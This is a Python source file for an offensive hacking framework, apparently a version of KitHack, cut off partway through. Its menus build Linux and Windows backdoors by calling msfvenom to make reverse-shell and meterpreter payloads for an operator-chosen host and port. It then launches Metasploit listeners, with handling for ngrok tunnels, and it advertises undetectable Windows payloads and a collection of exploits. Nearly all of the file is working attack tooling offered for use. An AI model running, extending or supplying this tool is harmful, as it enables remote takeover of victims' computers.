#!/usr/bin/python3
# -*- coding: utf-8 -*-

BLUE, RED, WHITE, CYAN, DEFAULT, YELLOW, MAGENTA, GREEN, END, BOLD = '\33[94m', '\033[91m', '\33[97m', '\033[36m', '\033[0m', '\33[93m', '\033[1;35m', '\033[1;32m', '\033[0m', '\033[1m'

import sys
import os 
import subprocess
import time
import py
import requests 
import webbrowser
from sys import exit 
from getch import pause  
from tkinter import Tk, filedialog
from lib.banner import *
from lib import toolkit
from lib.network import run_network

def check_connection(host='https://www.google.com'):
	print("{}Checking your internet connection...".format(GREEN))
	time.sleep(0.5)
	try:
		req = requests.get(host, timeout=15)
		if req.status_code == 200:
			print("{}Internet connection successful.".format(GREEN))
			time.sleep(0.5)
			pass
	except:
		print("{0}[x]:{1} Check your internet connection.".format(RED, DEFAULT))
		exit(0)

def check_permissions():
	if os.getuid() == 0:
		info()
	else:
		os.system('clear')
		print("{0}[!]{1} ¡Permission denied! Remember to run: {2}sudo {1}python3 KitHack.py".format(RED, DEFAULT, GREEN))
		exit(0)

def info():
	os.system('clear')
	print("{0}[VERSION]:{1} 1.3.2\n\n".format(RED, DEFAULT))
	time.sleep(0.5)
	print("{0}[AUTOR]:{1} Kartik\n\n".format(RED, DEFAULT))
	time.sleep(0.5)
	os.system('clear')


def main():
	print(start_main_menu)
	option = input("{0}framework>> {1}".format(RED, DEFAULT))
	option = option.zfill(2)

	if option == '02':
		os.system('clear')
		print ('========{0}Tool{1}================================================{0}Information{1}==================================='.format(GREEN, DEFAULT))
		print ('{0}01){1} Winpayloads             {2}Generador de payloads indetectables en Windows.'.format(WHITE, YELLOW, DEFAULT))
		print ('{0}02){1} Windows-Exploits        {2}Coleccion de Exploits Windows.'.format(WHITE, YELLOW, DEFAULT))
		print ('{0} 0){1} Back'.format(WHITE, YELLOW))

		tool = input("{0}framework >> {1}".format(RED, DEFAULT))
		tool = tool.zfill(2)
		
		if tool == '00':
			os.system('clear')
			main()

		elif tool == '01':
			toolkit.Winpayloads()

		elif tool == '02':
			toolkit.WindowsExploits()

		else:
			print("\n{}[X] INVALID OPTION".format(RED))
			time.sleep(1.5)
			os.system('clear')
			main()
			
# sys msfvenom
	elif option == '10':
		os.system('clear')
		print(msf_banner)
		print ('\n{0} [*] {1}Sys Payloads:\n'.format(DEFAULT, GREEN))
		print ('{0}[01] {1}LINUX {0}--> {2}Kithack.elf'.format(WHITE, YELLOW, RED))
		print ('{0}[02] {1}WINDOWS {0}--> {2}Kithack.exe'.format(WHITE, YELLOW, RED))
		print ('{0}[03] {1}ANDROID {0}--> {2}Kithack.apk'.format(WHITE, YELLOW, RED))
		print ('{0}[04] {1}RUN MSFCONSOLE {0}'.format(WHITE, YELLOW))
		print ('{0} [0] {1}Back'.format(WHITE, YELLOW))

		sys = input("{0}framework >> {1}".format(RED, DEFAULT))
		sys = sys.zfill(2)

		if sys == '00':
			os.system('clear')
			main()

		elif sys == '01':
			print ('{0}\n[*] {1}Select Payload:\n'.format(DEFAULT, GREEN))
			print ('{0}[01]{1} linux/x64/meterpreter_reverse_http'.format(WHITE, YELLOW))
			print ('{0}[02]{1} linux/x64/meterpreter_reverse_https'.format(WHITE, YELLOW))
			print ('{0}[03]{1} linux/x64/meterpreter_reverse_tcp'.format(WHITE, YELLOW))
			print ('{0}[04]{1} linux/x64/meterpreter/reverse_tcp'.format(WHITE, YELLOW))
			print ('{0}[05]{1} linux/x64/shell_bind_tcp'.format(WHITE, YELLOW))
			print ('{0}[06]{1} linux/x64/shell_reverse_tcp'.format(WHITE, YELLOW))
			print ('{0}[07]{1} linux/x86/meterpreter_reverse_http'.format(WHITE, YELLOW))
			print ('{0}[08]{1} linux/x86/meterpreter_reverse_https'.format(WHITE, YELLOW))
			print ('{0}[09]{1} linux/x86/meterpreter_reverse_tcp'.format(WHITE, YELLOW))
			print ('{0}[10]{1} linux/x86/meterpreter/reverse_tcp'.format(WHITE, YELLOW))
			print ('{0}[11]{1} linux/x86/shell_bind_tcp'.format(WHITE, YELLOW))
			print ('{0}[12]{1} linux/x86/shell_reverse_tcp'.format(WHITE, YELLOW))

			pay = input("{0}framework>> {1}".format(RED, DEFAULT))
			pay = pay.zfill(2)

			if pay == '01':
				run_network()
				LHOST = input("\n{0}SET LHOST: {1}".format(YELLOW, DEFAULT))
				LPORT = input("\n{0}SET LPORT: {1}".format(YELLOW, DEFAULT))
				OUT = input("\n{0}Enter a name for your output file: {1}".format(YELLOW, DEFAULT))
				mainout = os.path.splitext(OUT)[0]
				print("\n{0}[*] Generating backdoor...{1}".format(GREEN, DEFAULT))
				time.sleep(4)
				os.system('systemctl start postgresql && msfvenom -p linux/x64/meterpreter_reverse_http LHOST={0} LPORT={1} -f elf > output/{2}.elf'.format(LHOST, LPORT, mainout))
				location = os.getcwd()
				if os.stat('output/{}.elf'.format(mainout)).st_size != 0:
					print("\n{0}[✔] Done.\n{1}Backdoor: {2}/output/{3}.elf".format(GREEN, DEFAULT, location, mainout))	
					if input("\n{0}[!] Do you want to run msfconsole? (y/n)\n{1}framework>> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":
						os.system('systemctl stop postgresql && clear')
						main()
					else:						
						if not ".tcp.ngrok.io" in LHOST: 
							os.system('xterm -T "METASPOIT-CONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD linux/x64/meterpreter_reverse_http; exploit\'"'.format(LHOST, LPORT))
							pause("\n{}Press any key to continue...".format(GREEN))
							os.system('systemctl stop postgresql && clear')
							main()	
						else:
							os.system('xterm -T "METASPOIT-CONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST 127.0.0.1; set LPORT 443; set PAYLOAD linux/x64/meterpreter_reverse_http; exploit\'"')
							pause("\n{}Press any key to continue...".format(GREEN))
							os.system('systemctl stop postgresql && clear')
							main()	
				else:
					print("{}[X] ERROR WHILE GENERATING YOUR BACKDOOR\n".format(RED))
					time.sleep(3)
					pause("{}Press any key to continue...".format(GREEN))
					os.system('systemctl stop postgresql && clear')
					main()	

			elif pay == '02':
				run_network()
				LHOST = input("\n{0}SET LHOST: {1}".format(YELLOW, DEFAULT))
				LPORT = input("\n{0}SET LPORT: {1}".format(YELLOW, DEFAULT))
				OUT = input("\n{0}Enter a name for your output file: {1}".format(YELLOW, DEFAULT))
				mainout = os.path.splitext(OUT)[0]
				print("\n{0}[*] Generating backdoor...{1}".format(GREEN, DEFAULT))
				time.sleep(4)
				os.system('systemctl start postgresql && msfvenom -p linux/x64/meterpreter_reverse_https LHOST={0} LPORT={1} -f elf > output/{2}.elf'.format(LHOST, LPORT, mainout))
				location = os.getcwd()	
				if os.stat('output/{}.elf'.format(mainout)).st_size != 0:
					print("\n{0}[✔] Done.\n{1}Backdoor: {2}/output/{3}.elf".format(GREEN, DEFAULT, location, mainout))	
					if input("\n{0}[!] Do you want to run msfconsole? (y/n)\n{1}framework >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":
						os.system('systemctl stop postgresql && clear')
						main()
					else:
						if not ".tcp.ngrok.io" in LHOST: 
							os.system('xterm -T "METASPOIT-CONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD linux/x64/meterpreter_reverse_https; exploit\'"'.format(LHOST, LPORT))
							pause("\n{}Press any key to continue...".format(GREEN))
							os.system('systemctl stop postgresql && clear')
							main()	
						else:
							os.system('xterm -T "METASPOIT-CONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST 127.0.0.1; set LPORT 443; set PAYLOAD linux/x64/meterpreter_reverse_https; exploit\'"')
							pause("\n{}Press any key to continue...".format(GREEN))
							os.system('systemctl stop postgresql && clear')
							main()	
				else:
					print("{}[X] ERROR WHILE GENERATING YOUR BACKDOOR\n".format(RED))
					time.sleep(3)
					pause("{}Press any key to continue...".format(GREEN))
					os.system('systemctl stop postgresql && clear')
					main()		

			elif pay == '03':
				run_network()
				LHOST = input("\n{0}SET LHOST: {1}".format(YELLOW, DEFAULT))
				LPORT = input("\n{0}SET LPORT: {1}".format(YELLOW, DEFAULT))
				OUT = input("\n{0}Enter a name for your output file: {1}".format(YELLOW, DEFAULT))
				mainout = os.path.splitext(OUT)[0]
				print("\n{0}[*] Generating backdoor...{1}".format(GREEN, DEFAULT))
				time.sleep(4)
				os.system('systemctl start postgresql && msfvenom -p linux/x64/meterpreter_reverse_tcp LHOST={0} LPORT={1} -f elf > output/{2}.elf'.format(LHOST, LPORT, mainout))
				location = os.getcwd()
				if os.stat('output/{}.elf'.format(mainout)).st_size != 0:
					print("\n{0}[✔] Done.\n{1}Backdoor: {2}/output/{3}.elf".format(GREEN, DEFAULT, location, mainout))	
					if input("\n{0}[!] Do you want to run msfconsole? (y/n)\n{1}framework >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":
						os.system('systemctl stop postgresql && clear')
						main()
					else:
						if not ".tcp.ngrok.io" in LHOST: 
							os.system('xterm -T "METASPOIT-CONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD linux/x64/meterpreter_reverse_tcp; exploit\'"'.format(LHOST, LPORT))
							pause("\n{}Press any key to continue...".format(GREEN))
							os.system('systemctl stop postgresql && clear')
							main()	
						else:
							os.system('xterm -T "METASPOIT-CONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST 127.0.0.1; set LPORT 443; set PAYLOAD linux/x64/meterpreter_reverse_tcp; exploit\'"')
							pause("\n{}Press any key to continue...".format(GREEN))
							os.system('systemctl stop postgresql && clear')
							main()	
				else:
					print("{}[X] ERROR WHILE GENERATING YOUR BACKDOOR\n".format(RED))
					time.sleep(3)
					pause("{}Press any key to continue...".format(GREEN))
					os.system('systemctl stop postgresql && clear')
					main()	

			elif pay == '04':
				run_network()
				LHOST = input("\n{0}SET LHOST: {1}".format(YELLOW, DEFAULT))
				LPORT = input("\n{0}SET LPORT: {1}".format(YELLOW, DEFAULT))
				OUT = input("\n{0}Enter a name for your output file: {1}".format(YELLOW, DEFAULT))
				mainout = os.path.splitext(OUT)[0]
				print("\n{0}[*] Generating backdoor...{1}".format(GREEN, DEFAULT))
				time.sleep(4)
				os.system('systemctl start postgresql && msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST={0} LPORT={1} -f elf > output/{2}.elf'.format(LHOST, LPORT, mainout))
				location = os.getcwd()
				if os.stat('output/{}.elf'.format(mainout)).st_size != 0:
					print("\n{0}[✔] Done.\n{1}Backdoor: {2}/output/{3}.elf".format(GREEN, DEFAULT, location, mainout))	
					if input("\n{0}[!] Do you want to run msfconsole? (y/n)\n{1}framework >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":
						os.system('systemctl stop postgresql && clear')
						main()
					else:
						if not ".tcp.ngrok.io" in LHOST: 
							os.system('xterm -T "METASPOIT-CONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD linux/x64/meterpreter/reverse_tcp; exploit\'"'.format(LHOST, LPORT))
							pause("\n{}Press any key to continue...".format(GREEN))
							os.system('systemctl stop postgresql && clear')
							main()	
						else:
							os.system('xterm -T "METASPOIT-CONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST 127.0.0.1; set LPORT 443; set PAYLOAD linux/x64/meterpreter/reverse_tcp; exploit\'"')
							pause("\n{}Press any key to continue...".format(GREEN))
							os.system('systemctl stop postgresql && clear')
							main()	
				else:
					print("{}[X] ERROR WHILE GENERATING YOUR BACKDOOR\n".format(RED))
					time.sleep(3)
					pause("{}Press any key to continue...".format(GREEN))
					os.system('systemctl stop postgresql && clear')
					main()

			elif pay == '05':
				run_network()
				LHOST = input("\n{0}SET LHOST: {1}".format(YELLOW, DEFAULT))
				LPORT = input("\n{0}SET LPORT: {1}".format(YELLOW, DEFAULT))
				OUT = input("\n{0}Enter a name for your output file: {1}".format(YELLOW, DEFAULT))
				mainout = os.path.splitext(OUT)[0]
				print("\n{0}[*] Generating backdoor...{1}".format(GREEN, DEFAULT))
				time.sleep(4)
				os.system('systemctl start postgresql && msfvenom -p linux/x64/shell_bind_tcp LHOST={0} LPORT={1} -f elf > output/{2}.elf'.format(LHOST, LPORT, mainout))
				location = os.getcwd()
				if os.stat('output/{}.elf'.format(mainout)).st_size != 0:
					print("\n{0}[✔] Done.\n{1}Backdoor: {2}/output/{3}.elf".format(GREEN, DEFAULT, location, mainout))	
					if input("\n{0}[!] Do you want to run msfconsole? (y/n)\n{1}framework >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":
						os.system('systemctl stop postgresql && clear')
						main()
					else:
						if not ".tcp.ngrok.io" in LHOST: 
							os.system('xterm -T "METASPOIT-CONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD linux/x64/shell_bind_tcp; exploit\'"'.format(LHOST, LPORT))
							pause("\n{}Press any key to continue...".format(GREEN))
							os.system('systemctl stop postgresql && clear')
							main()	
						else:
							os.system('xterm -T "METASPOIT-CONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST 127.0.0.1; set LPORT 443; set PAYLOAD linux/x64/shell_bind_tcp; exploit\'"')
							pause("\n{}Press any key to continue...".format(GREEN))
							os.system('systemctl stop postgresql && clear')
							main()	
				else:
					print("{}[X] ERROR WHILE GENERATING YOUR BACKDOOR\n".format(RED))
					time.sleep(3)
					pause("{}Press any key to continue...".format(GREEN))
					os.system('systemctl stop postgresql && clear')
					main()	

			elif pay == '06':
				run_network()
				LHOST = input("\n{0}SET LHOST: {1}".format(YELLOW, DEFAULT))
				LPORT = input("\n{0}SET LPORT: {1}".format(YELLOW, DEFAULT))
				OUT = input("\n{0}Enter a name for your output file: {1}".format(YELLOW, DEFAULT))
				mainout = os.path.splitext(OUT)[0]
				print("\n{0}[*] Generating backdoor...{1}".format(GREEN, DEFAULT))
				time.sleep(4)
				os.system('systemctl start postgresql && msfvenom -p linux/x64/shell_reverse_tcp LHOST={0} LPORT={1} -f elf > output/{2}.elf'.format(LHOST, LPORT, mainout))
				location = os.getcwd()	
				if os.stat('output/{}.elf'.format(mainout)).st_size != 0:
					print("\n{0}[✔] Done.\n{1}Backdoor: {2}/output/{3}.elf".format(GREEN, DEFAULT, location, mainout))	
					if input("\n{0}[!] Do you want to run msfconsole? (y/n)\n{1}framework >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":
						os.system('systemctl stop postgresql && clear')
						main()
					else:
						if not ".tcp.ngrok.io" in LHOST: 
							os.system('xterm -T "METASPOIT-CONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD linux/x64/shell_reverse_tcp; exploit\'"'.format(LHOST, LPORT))
							pause("\n{}Press any key to continue...".format(GREEN))
							os.system('systemctl stop postgresql && clear')
							main()	
						else:
							os.system('xterm -T "METASPOIT-CONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST 127.0.0.1; set LPORT 443; set PAYLOAD linux/x64/shell_reverse_tcp; exploit\'"')
							pause("\n{}Press any key to continue...".format(GREEN))
							os.system('systemctl stop postgresql && clear')
							main()		
				else:
					print("{}[X] ERROR WHILE GENERATING YOUR BACKDOOR\n".format(RED))
					time.sleep(3)
					pause("{}Press any key to continue...".format(GREEN))
					os.system('systemctl stop postgresql && clear')
					main()	

			elif pay == '07':
				run_network()
				LHOST = input("\n{0}SET LHOST: {1}".format(YELLOW, DEFAULT))
				LPORT = input("\n{0}SET LPORT: {1}".format(YELLOW, DEFAULT))
				OUT = input("\n{0}Enter a name for your output file: {1}".format(YELLOW, DEFAULT))
				mainout = os.path.splitext(OUT)[0]
				print("\n{0}[*] Generating backdoor...{1}".format(GREEN, DEFAULT))
				time.sleep(4)
				os.system('systemctl start postgresql && msfvenom -p linux/x86/meterpreter_reverse_http LHOST={0} LPORT={1} -f elf > output/{2}.elf'.format(LHOST, LPORT, mainout))	
				location = os.getcwd()
				if os.stat('output/{}.elf'.format(mainout)).st_size != 0:
					print("\n{0}[✔] Done.\n{1}Backdoor: {2}/output/{3}.elf".format(GREEN, DEFAULT, location, mainout))	
					if input("\n{0}[!] Do you want to run msfconsole? (y/n)\n{1}framework >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":
						os.system('systemctl stop postgresql && clear')
						main()
					else:
						if not ".tcp.ngrok.io" in LHOST: 
							os.system('xterm -T "METASPOIT-CONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD linux/x86/meterpreter_reverse_http; exploit\'"'.format(LHOST, LPORT))
							pause("\n{}Press any key to continue...".format(GREEN))
							os.system('systemctl stop postgresql && clear')
							main()	
						else:
							os.system('xterm -T "METASPOIT-CONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST 127.0.0.1; set LPORT 443; set PAYLOAD linux/x86/meterpreter_reverse_http; exploit\'"')
							pause("\n{}Press any key to continue...".format(GREEN))
							os.system('systemctl stop postgresql && clear')
							main()	
				else:
					print("{}[X] ERROR WHILE GENERATING YOUR BACKDOOR\n".format(RED))
					time.sleep(3)
					pause("{}Press any key to continue...".format(GREEN))
					os.system('systemctl stop postgresql && clear')
					main()	

			elif pay == '08':
				run_network()
				LHOST = input("\n{0}SET LHOST: {1}".format(YELLOW, DEFAULT))
				LPORT = input("\n{0}SET LPORT: {1}".format(YELLOW, DEFAULT))
				OUT = input("\n{0}Enter a name for your output file: {1}".format(YELLOW, DEFAULT))
				mainout = os.path.splitext(OUT)[0]
				print("\n{0}[*] Generating backdoor...{1}".format(GREEN, DEFAULT))
				time.sleep(4)
				os.system('systemctl start postgresql && msfvenom -p linux/x86/meterpreter_reverse_https LHOST={0} LPORT={1} -f elf > output/{2}.elf'.format(LHOST, LPORT, mainout))																				
				location = os.getcwd()
				if os.stat('output/{}.elf'.format(mainout)).st_size != 0:
					print("\n{0}[✔] Done.\n{1}Backdoor: {2}/output/{3}.elf".format(GREEN, DEFAULT, location, mainout))	
					if input("\n{0}[!] Do you want to run msfconsole? (y/n)\n{1}KitHack >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":
						os.system('systemctl stop postgresql && clear')
						main()
					else:
						if not ".tcp.ngrok.io" in LHOST: 
							os.system('xterm -T "MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD linux/x86/meterpreter_reverse_https; exploit\'"'.format(LHOST, LPORT))
							pause("\n{}Press any key to continue...".format(GREEN))
							os.system('systemctl stop postgresql && clear')
							main()	
						else:
							os.system('xterm -T "MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST 127.0.0.1; set LPORT 443; set PAYLOAD linux/x86/meterpreter_reverse_https; exploit\'"')
							pause("\n{}Press any key to continue...".format(GREEN))
							os.system('systemctl stop postgresql && clear')
							main()	
				else:
					print("{}[X] ERROR AL GENERAR SU BACKDOOR\n".format(RED))
					time.sleep(3)
					pause("{}Press any key to continue...".format(GREEN))
					os.system('systemctl stop postgresql && clear')
					main()				

			elif pay == '09':
				run_network()
				LHOST = input("\n{0}SET LHOST: {1}".format(YELLOW, DEFAULT))
				LPORT = input("\n{0}SET LPORT: {1}".format(YELLOW, DEFAULT))
				OUT = input("\n{0}Enter a name for your output file: {1}".format(YELLOW, DEFAULT))
				mainout = os.path.splitext(OUT)[0]
				print("\n{0}[*] Generating backdoor...{1}".format(GREEN, DEFAULT))
				time.sleep(4)
				os.system('systemctl start postgresql && msfvenom -p linux/x86/meterpreter_reverse_tcp LHOST={0} LPORT={1} -f elf > output/{2}.elf'.format(LHOST, LPORT, mainout))																				
				location = os.getcwd()
				if os.stat('output/{}.elf'.format(mainout)).st_size != 0:
					print("\n{0}[✔] Done.\n{1}Backdoor: {2}/output/{3}.elf".format(GREEN, DEFAULT, location, mainout))	
					if input("\n{0}[!] Do you want to run msfconsole? (y/n)\n{1}framework >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":
						os.system('systemctl stop postgresql && clear')
						main()
					else:
						if not ".tcp.ngrok.io" in LHOST: 
							os.system('xterm -T "METASPOIT-CONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD linux/x86/meterpreter_reverse_tcp; exploit\'"'.format(LHOST, LPORT))
							pause("\n{}Press any key to continue...".format(GREEN))
							os.system('systemctl stop postgresql && clear')
							main()	
						else:
							os.system('xterm -T "METASPOIT-CONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST 127.0.0.1; set LPORT 443; set PAYLOAD linux/x86/meterpreter_reverse_tcp; exploit\'"')
							pause("\n{}Press any key to continue...".format(GREEN))
							os.system('systemctl stop postgresql && clear')
							main()	
				else:
					print("{}[X] ERROR WHILE GENERATING YOUR BACKDOOR\n".format(RED))
					time.sleep(3)
					pause("{}Press any key to continue...".format(GREEN))
					os.system('systemctl stop postgresql && clear')
					main()	

			elif pay == '10':
				run_network()
				LHOST = input("\n{0}SET LHOST: {1}".format(YELLOW, DEFAULT))
				LPORT = input("\n{0}SET LPORT: {1}".format(YELLOW, DEFAULT))
				OUT = input("\n{0}Enter a name for your output file: {1}".format(YELLOW, DEFAULT))
				mainout = os.path.splitext(OUT)[0]
				print("\n{0}[*] Generating backdoor...{1}".format(GREEN, DEFAULT))
				time.sleep(4)
				os.system('systemctl start postgresql && msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST={0} LPORT={1} -f elf > output/{2}.elf'.format(LHOST, LPORT, mainout))																				
				location = os.getcwd()
				if os.stat('output/{}.elf'.format(mainout)).st_size != 0:
					print("\n{0}[✔] Done.\n{1}Backdoor: {2}/output/{3}.elf".format(GREEN, DEFAULT, location, mainout))	
					if input("\n{0}[!] Do you want to run msfconsole? (y/n)\n{1}framework >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":
						os.system('systemctl stop postgresql && clear')
						main()
					else:
						if not ".tcp.ngrok.io" in LHOST: 
							os.system('xterm -T "METASPOIT-CONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD linux/x86/meterpreter/reverse_tcp; exploit\'"'.format(LHOST, LPORT))
							pause("\n{}Press any key to continue...".format(GREEN))
							os.system('systemctl stop postgresql && clear')
							main()	
						else:
							os.system('xterm -T "METASPOIT-CONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST 127.0.0.1; set LPORT 443; set PAYLOAD linux/x86/meterpreter/reverse_tcp; exploit\'"')
							pause("\n{}Press any key to continue...".format(GREEN))
							os.system('systemctl stop postgresql && clear')
							main()	
				else:
					print("{}[X] ERROR WHILE GENERATING YOUR BACKDOOR\n".format(RED))
					time.sleep(3)
					pause("{}Press any key to continue...".format(GREEN))
					os.system('systemctl stop postgresql && clear')
					main()	

			elif pay == '11':
				run_network()
				LHOST = input("\n{0}SET LHOST: {1}".format(YELLOW, DEFAULT))
				LPORT = input("\n{0}SET LPORT: {1}".format(YELLOW, DEFAULT))
				OUT = input("\n{0}Enter a name for your output file: {1}".format(YELLOW, DEFAULT))
				mainout = os.path.splitext(OUT)[0]
				print("\n{0}[*] Generating backdoor...{1}".format(GREEN, DEFAULT))
				time.sleep(4)
				os.system('systemctl start postgresql && msfvenom -p linux/x86/shell_bind_tcp LHOST={0} LPORT={1} -f elf > output/{2}.elf'.format(LHOST, LPORT, mainout))																				
				location = os.getcwd()
				if os.stat('output/{}.elf'.format(mainout)).st_size != 0:
					print("\n{0}[✔] Done.\n{1}Backdoor: {2}/output/{3}.elf".format(GREEN, DEFAULT, location, mainout))	
					if input("\n{0}[!] Do you want to run msfconsole? (y/n)\n{1}framework >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":
						os.system('systemctl stop postgresql && clear')
						main()
					else:
						if not ".tcp.ngrok.io" in LHOST: 
							os.system('xterm -T "MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD linux/x86/shell_bind_tcp; exploit\'"'.format(LHOST, LPORT))
							pause("\n{}Press any key to continue...".format(GREEN))
							os.system('systemctl stop postgresql && clear')
							main()	
						else:
							os.system('xterm -T "MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST 127.0.0.1; set LPORT 443; set PAYLOAD linux/x86/shell_bind_tcp; exploit\'"')
							pause("\n{}Press any key to continue...".format(GREEN))
							os.system('systemctl stop postgresql && clear')
							main()	
				else:
					print("{}[X] ERROR WHILE GENERATING YOUR BACKDOOR\n".format(RED))
					time.sleep(3)
					pause("{}Press any key to continue...".format(GREEN))
					os.system('systemctl stop postgresql && clear')
					main()	

			elif pay == '12':
				run_network()
				LHOST = input("\n{0}SET LHOST: {1}".format(YELLOW, DEFAULT))
				LPORT = input("\n{0}SET LPORT: {1}".format(YELLOW, DEFAULT))
				OUT = input("\n{0}Enter a name for your output file: {1}".format(YELLOW, DEFAULT))
				mainout = os.path.splitext(OUT)[0]
				print("\n{0}[*] Generating backdoor...{1}".format(GREEN, DEFAULT))
				time.sleep(4)
				os.system('systemctl start postgresql && msfvenom -p linux/x86/shell_reverse_tcp LHOST={0} LPORT={1} -f elf > output/{2}.elf'.format(LHOST, LPORT, mainout))																				
				location = os.getcwd()
				if os.stat('output/{}.elf'.format(mainout)).st_size != 0:
					print("\n{0}[✔] Done.\n{1}Backdoor: {2}/output/{3}.elf".format(GREEN, DEFAULT, location, mainout))	
					if input("\n{0}[!] Do you want to run msfconsole? (y/n)\n{1}framework >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":
						os.system('systemctl stop postgresql && clear')
						main()
					else:
						if not ".tcp.ngrok.io" in LHOST: 
							os.system('xterm -T "METASPOIT-CONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD linux/x86/shell_reverse_tcp; exploit\'"'.format(LHOST, LPORT))
							pause("\n{}Press any key to continue...".format(GREEN))
							os.system('systemctl stop postgresql && clear')
							main()	
						else:
							os.system('xterm -T "METASPOIT-CONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST 127.0.0.1; set LPORT 443; set PAYLOAD linux/x86/shell_reverse_tcp; exploit\'"')
							pause("\n{}Press any key to continue...".format(GREEN))
							os.system('systemctl stop postgresql && clear')
							main()	
				else:
					print("{}[X] ERROR WHILE GENERATING YOUR BACKDOOR\n".format(RED))
					time.sleep(3)
					pause("{}Press any key to continue...".format(GREEN))
					os.system('systemctl stop postgresql && clear')
					main()	
				
		elif sys == '02':
			print ('{0}\n [*] {1}Select Payload:\n'.format(DEFAULT, GREEN))
			print ('{0}[01]{1} windows/x64/meterpreter_reverse_http'.format(WHITE, YELLOW))
			print ('{0}[02]{1} windows/x64/meterpreter_reverse_https'.format(WHITE, YELLOW))
			print ('{0}[03]{1} windows/x64/meterpreter_reverse_tcp'.format(WHITE, YELLOW))
			print ('{0}[04]{1} windows/x64/meterpreter/reverse_tcp'.format(WHITE, YELLOW))
			print ('{0}[05]{1} windows/x64/powershell_reverse_tcp'.format(WHITE, YELLOW))
			print ('{0}[06]{1} windows/x64/shell_reverse_tcp'.format(WHITE, YELLOW))
			print ('{0}[07]{1} windows/meterpreter_reverse_http'.format(WHITE, YELLOW))
			print ('{0}[08]{1} windows/meterpreter_reverse_https'.format(WHITE, YELLOW))
			print ('{0}[09]{1} windows/meterpreter_reverse_tcp'.format(WHITE, YELLOW))
			print ('{0}[10]{1} windows/meterpreter/reverse_tcp'.format(WHITE, YELLOW))
			print ('{0}[11]{1} windows/meterpreter/reverse_tcp_dns'.format(WHITE, YELLOW))
			print ('{0}[12]{1} windows/metsvc_reverse_tcp'.format(WHITE, YELLOW))
			print ('{0}[13]{1} windows/powershell_reverse_tcp'.format(WHITE, YELLOW))
			print ('{0}[14]{1} windows/shell_reverse_tcp'.format(WHITE, YELLOW))

			pay = input("{0}framework >> {1}".format(RED, DEFAULT))
			pay = pay.zfill(2)

			if pay == '01':
				run_network()
				LHOST = input("\n{0}SET LHOST: {1}".format(YELLOW, DEFAULT))
				LPORT = input("\n{0}SET LPORT: {1}".format(YELLOW, DEFAULT))
				OUT = input("\n{0}Enter a name for your output file: {1}".format(YELLOW, DEFAULT))
				mainout = os.path.splitext(OUT)[0]
				print("\n{0}[*] Generating backdoor...{1}".format(GREEN, DEFAULT))
				time.sleep(4)
				os.system('systemctl start postgresql && msfvenom -p windows/x64/meterpreter_reverse_http LHOST={0} LPORT={1} -f exe > output/{2}.exe'.format(LHOST, LPORT, mainout))																				
				location = os.getcwd()
				if os.stat('output/{}.exe'.format(mainout)).st_size != 0:					
					print("\n{0}[✔] Done.\n{1}Backdoor: {2}/output/{3}.exe".format(GREEN, DEFAULT, location, mainout))	
					if input("\n{0}[!] Do you want to run msfconsole? (y/n)\n{1}framework >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":
						os.system('systemctl stop postgresql && clear')
						main()
					else:
